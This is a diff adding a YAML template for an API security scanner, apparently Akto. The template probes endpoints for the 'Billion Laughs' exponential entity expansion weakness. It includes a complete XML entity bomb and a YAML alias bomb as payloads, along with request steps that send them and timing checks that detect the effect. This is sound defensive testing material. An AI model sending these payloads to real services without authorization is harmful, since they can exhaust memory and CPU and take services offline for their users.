@@ -1,0 +1,104 @@
+id: EXPONENTIAL_ENTITY_EXPANSION
+info:
+  name: Exponential Entity Expansion (XML Bomb)
+  description: |
+    "Exponential entity expansion, also known as an 'XML bomb' or 'Billion Laughs' attack, involves abusing XML parsers by including numerous nested or recursive entities in an XML document. This can cause the parser to expand these entities exponentially, leading to excessive memory and CPU consumption, potentially crashing the server or making it unavailable."
+  details: |
+    "This type of attack targets XML parsers that do not properly limit the expansion of entities within XML documents. By creating a document with a large number of nested or recursive entity references, an attacker can cause the parser to consume large amounts of memory and processing power, which can result in Denial of Service (DoS). The scan checks for vulnerability to exponential entity expansion by submitting XML payloads designed to test whether the server properly handles and limits entity expansion."
+  impact: |
+    "Exponential entity expansion attacks can cause servers to become unresponsive or crash due to high memory or CPU usage. This can result in a denial of service, preventing legitimate users from accessing the application. In some cases, attackers can exploit this to disrupt critical services or take systems offline. Properly configuring XML parsers to limit entity expansion or disabling external entity resolution can mitigate this risk."
+  category:
+    name: RL
+    shortName: Lack of Resources & Rate Limiting
+    displayName: Lack of Resources & Rate Limiting (RL)
+  subCategory: EXPONENTIAL_ENTITY_EXPANSION
+  severity: LOW
+  references:
+    - https://en.wikipedia.org/wiki/Billion_laughs_attack
+  cwe:
+    - CWE-200
+    - CWE-213
+  cve:
+    - CVE-2018-10245
+attributes:
+  nature: INTRUSIVE
+  plan: STANDARD
+  duration: SLOW
+
+
+api_selection_filters:
+  method:
+    neq: OPTIONS
+  response_code:
+    gte: 200
+    lt: 300
+  request_headers:
+    for_one:
+      key:
+        eq: content-type
+      value:
+        contains_either:
+          - xml
+          - yaml
+          - yml
+wordLists:
+  payloads:
+    - xml_payload: |
+        <?xml version="1.0"?>
+        <!DOCTYPE lolz [
+          <!ENTITY lol "lol">
+          <!ELEMENT lolz (#PCDATA)>
+          <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+          <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+        ]>
+        <lolz>&lol9;</lolz>
+    - yaml_payload: |
+        a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
+        b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
+        c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
+        d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
+        e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
+        f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
+        g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
+        h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
+        i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
+execute:
+  type: multiple
+  requests:
+    - req:
+        - add_header:
+            x-akto-ignore: 123
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+        - success: x2
+        - failure: exit
+    - req:
+        - replace_body: "${payloads}"
+        - validate:
+            response_code:
+              or:
+                - and:
+                    - gte: 200
+                    - lt: 300
+          # expecting socket timeout.
+                - gte: 500
+            response_payload:
+              length:
+                gt: 0
+validate:
+  and:
+    - compare_greater:
+        - "${x2.response.stats.median_response_time}"
+        - 3001
+    - compare_greater:
+        - "${x2.response.stats.median_response_time}"
+        - "${x1.response.stats.median_response_time} * 3"
